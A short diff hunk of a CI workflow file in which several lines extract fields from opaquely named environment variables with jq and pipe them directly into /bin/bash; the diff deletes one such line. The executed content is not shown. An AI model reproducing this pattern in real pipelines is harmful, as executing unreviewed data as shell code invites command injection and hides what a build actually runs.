@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$ctf24" | jq -r .wvfh3060 | /bin/bash
           echo $c16 | jq -r .q6 | /bin/bash
           echo $o255 | jq -r .mya34 | /bin/bash
-          printf '%s' "$xnc2973" | jq -r .telid99 | /bin/bash
           echo $nty6 | jq -r .wofuu734 | /bin/bash
 
       - name: Store output
